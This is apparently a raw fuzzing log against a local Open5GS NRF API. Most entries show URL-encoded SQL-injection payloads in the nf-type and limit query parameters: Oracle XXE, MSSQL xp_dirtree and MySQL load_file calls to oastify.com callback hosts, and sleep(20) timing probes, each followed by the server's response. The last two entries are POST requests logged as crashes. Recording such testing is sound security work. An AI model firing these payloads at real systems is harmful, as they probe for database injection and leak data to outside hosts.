@@ -1,0 +1,367 @@
+
+Request Number 1
+
+GET http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dxtre%20SYSTEM%20%22http%3a%2f%2fne55u7klph2p49kpr2fjfn481z7qbe124qvdl1a.oasti'%7c%7c'fy.com%2f%22%3e%25dxtre%3b]%3e')%2c'%2fl')%20from%20dual)&limit=
+
+
+------------------------------------------------------------
+
+Request Number 2
+
+GET http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type='%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dxtre%20SYSTEM%20%22http%3a%2f%2f9mwr2ts7x3abcvsbzon5n9cu9lfcj09odc4zunj.oasti'%7c%7c'fy.com%2f%22%3e%25dxtre%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'&limit=
+
+
+------------------------------------------------------------
+{'content-length': '1179',
+ 'content-type': 'application/3gppHal+json',
+ 'date': 'Sun, 02 Apr 2023 18:48:16 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+Status Code: 200
+{
+	"_links":	{
+		"items":	[{
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/bb30de20-d186-41ed-893b-39dd5baacf0f"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2c74c2-d186-41ed-9665-3d8597de5080"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2dbc4c-d186-41ed-a133-ef5b9f4d5c5c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ddf10-d186-41ed-b245-dd315e30dd67"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e7966-d186-41ed-885e-2d030bedda28"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2db774-d186-41ed-8fc6-1be52096c276"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e9ae0-d186-41ed-b26d-0b6f10478e9c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ead5a-d186-41ed-a35f-13d71639d3b4"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e5cba-d186-41ed-bf48-8b77747ea438"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2f94f4-d186-41ed-bd02-574126e87bc8"
+			}],
+		"self":	{
+			"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances"
+		}
+	}
+}
+========================================================================================================================
+
+Request Number 3
+
+GET http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type=%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cm8v4o6ekjgwoy8eol19i9my7vy1p5dv1mraix8lx.oasti'%2b'fy.com%5cxnx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=
+
+
+------------------------------------------------------------
+{'content-length': '1179',
+ 'content-type': 'application/3gppHal+json',
+ 'date': 'Sun, 02 Apr 2023 18:48:16 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+Status Code: 200
+{
+	"_links":	{
+		"items":	[{
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/bb30de20-d186-41ed-893b-39dd5baacf0f"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2c74c2-d186-41ed-9665-3d8597de5080"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2dbc4c-d186-41ed-a133-ef5b9f4d5c5c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ddf10-d186-41ed-b245-dd315e30dd67"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e7966-d186-41ed-885e-2d030bedda28"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2db774-d186-41ed-8fc6-1be52096c276"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e9ae0-d186-41ed-b26d-0b6f10478e9c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ead5a-d186-41ed-a35f-13d71639d3b4"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e5cba-d186-41ed-bf48-8b77747ea438"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2f94f4-d186-41ed-bd02-574126e87bc8"
+			}],
+		"self":	{
+			"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances"
+		}
+	}
+}
+========================================================================================================================
+
+Request Number 4
+
+GET http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type='%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cx20fih8vdrqzsj8zfc3t3xsip9v0zopcg34urkf9.oasti'%2b'fy.com%5cplm'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=
+
+
+------------------------------------------------------------
+{'content-length': '1179',
+ 'content-type': 'application/3gppHal+json',
+ 'date': 'Sun, 02 Apr 2023 18:48:16 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+Status Code: 200
+{
+	"_links":	{
+		"items":	[{
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/bb30de20-d186-41ed-893b-39dd5baacf0f"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2c74c2-d186-41ed-9665-3d8597de5080"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2dbc4c-d186-41ed-a133-ef5b9f4d5c5c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ddf10-d186-41ed-b245-dd315e30dd67"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e7966-d186-41ed-885e-2d030bedda28"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2db774-d186-41ed-8fc6-1be52096c276"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e9ae0-d186-41ed-b26d-0b6f10478e9c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ead5a-d186-41ed-a35f-13d71639d3b4"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e5cba-d186-41ed-bf48-8b77747ea438"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2f94f4-d186-41ed-bd02-574126e87bc8"
+			}],
+		"self":	{
+			"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances"
+		}
+	}
+}
+========================================================================================================================
+
+Request Number 5
+
+GET http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type=)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cwiieygoutq6y8ioyvbjsjw8h58bzfn5bw3ku7kv9.oasti'%2b'fy.com%5cimx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=
+
+
+------------------------------------------------------------
+{'content-length': '1179',
+ 'content-type': 'application/3gppHal+json',
+ 'date': 'Sun, 02 Apr 2023 18:48:16 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+Status Code: 200
+{
+	"_links":	{
+		"items":	[{
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/bb30de20-d186-41ed-893b-39dd5baacf0f"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2c74c2-d186-41ed-9665-3d8597de5080"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2dbc4c-d186-41ed-a133-ef5b9f4d5c5c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ddf10-d186-41ed-b245-dd315e30dd67"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e7966-d186-41ed-885e-2d030bedda28"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2db774-d186-41ed-8fc6-1be52096c276"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e9ae0-d186-41ed-b26d-0b6f10478e9c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ead5a-d186-41ed-a35f-13d71639d3b4"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e5cba-d186-41ed-bf48-8b77747ea438"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2f94f4-d186-41ed-bd02-574126e87bc8"
+			}],
+		"self":	{
+			"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances"
+		}
+	}
+}
+========================================================================================================================
+
+Request Number 12
+
+GET http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type='%20and%20(select*from(select(sleep(20)))a)--%20&limit=
+
+
+------------------------------------------------------------
+{'content-length': '1179',
+ 'content-type': 'application/3gppHal+json',
+ 'date': 'Sun, 02 Apr 2023 18:48:16 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+Status Code: 200
+{
+	"_links":	{
+		"items":	[{
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/bb30de20-d186-41ed-893b-39dd5baacf0f"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2c74c2-d186-41ed-9665-3d8597de5080"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2dbc4c-d186-41ed-a133-ef5b9f4d5c5c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ddf10-d186-41ed-b245-dd315e30dd67"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e7966-d186-41ed-885e-2d030bedda28"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2db774-d186-41ed-8fc6-1be52096c276"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e9ae0-d186-41ed-b26d-0b6f10478e9c"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2ead5a-d186-41ed-a35f-13d71639d3b4"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2e5cba-d186-41ed-bf48-8b77747ea438"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/be2f94f4-d186-41ed-bd02-574126e87bc8"
+			}],
+		"self":	{
+			"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances"
+		}
+	}
+}
+========================================================================================================================
+
+Request Number 124
+
+GET http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type=&limit='%2b(select%20load_file('%5c%5c%5c%5c1xzjdl3z8vl3nn33agyxy1nmkdq4uskgbjzam1aq.oastify.com%5c%5cxan'))%2b'
+
+
+------------------------------------------------------------
+{'content-length': '1179',
+ 'content-type': 'application/3gppHal+json',
+ 'date': 'Sun, 02 Apr 2023 18:49:42 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+Status Code: 200
+{
+	"_links":	{
+		"items":	[{
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1955f648-d187-41ed-893b-ed458be00f78"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c51d2ae-d187-41ed-ace7-03111a19af8b"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c5227b8-d187-41ed-9f21-e9cc2bc874e9"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c522baa-d187-41ed-ad38-1d4d4521a6b8"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c52240c-d187-41ed-99f2-3730bb9b4af3"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c53d28e-d187-41ed-951d-9760f064e553"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c5224ca-d187-41ed-94b5-170502408dec"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c529dce-d187-41ed-a1cb-b3bd37573c29"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c5313ee-d187-41ed-9745-c55eb0983e7a"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c543fc6-d187-41ed-8103-cd211423c5d6"
+			}],
+		"self":	{
+			"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances"
+		}
+	}
+}
+========================================================================================================================
+
+Request Number 125
+
+GET http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type=&limit='
+
+
+------------------------------------------------------------
+{'content-length': '1179',
+ 'content-type': 'application/3gppHal+json',
+ 'date': 'Sun, 02 Apr 2023 18:49:42 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+Status Code: 200
+{
+	"_links":	{
+		"items":	[{
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1955f648-d187-41ed-893b-ed458be00f78"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c51d2ae-d187-41ed-ace7-03111a19af8b"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c5227b8-d187-41ed-9f21-e9cc2bc874e9"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c522baa-d187-41ed-ad38-1d4d4521a6b8"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c52240c-d187-41ed-99f2-3730bb9b4af3"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c53d28e-d187-41ed-951d-9760f064e553"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c5224ca-d187-41ed-94b5-170502408dec"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c529dce-d187-41ed-a1cb-b3bd37573c29"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c5313ee-d187-41ed-9745-c55eb0983e7a"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c543fc6-d187-41ed-8103-cd211423c5d6"
+			}],
+		"self":	{
+			"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances"
+		}
+	}
+}
+========================================================================================================================
+
+Request Number 126
+
+GET http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type=&limit='(select*from(select(sleep(20)))a)'
+
+
+------------------------------------------------------------
+{'content-length': '1179',
+ 'content-type': 'application/3gppHal+json',
+ 'date': 'Sun, 02 Apr 2023 18:49:42 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+Status Code: 200
+{
+	"_links":	{
+		"items":	[{
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1955f648-d187-41ed-893b-ed458be00f78"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c51d2ae-d187-41ed-ace7-03111a19af8b"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c5227b8-d187-41ed-9f21-e9cc2bc874e9"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c522baa-d187-41ed-ad38-1d4d4521a6b8"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c52240c-d187-41ed-99f2-3730bb9b4af3"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c53d28e-d187-41ed-951d-9760f064e553"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c5224ca-d187-41ed-94b5-170502408dec"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c529dce-d187-41ed-a1cb-b3bd37573c29"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c5313ee-d187-41ed-9745-c55eb0983e7a"
+			}, {
+				"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1c543fc6-d187-41ed-8103-cd211423c5d6"
+			}],
+		"self":	{
+			"href":	"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances"
+		}
+	}
+}
+========================================================================================================================
+
+Request Number 614
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?LQxP=1794642602
+
+
+
+------------------------------------------------------------
+
+** open5gs crash **
+
+========================================================================================================================
+
+Request Number 616
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?nf-type=&limit=
+
+
+
+------------------------------------------------------------
+
+** open5gs crash **
+
+========================================================================================================================
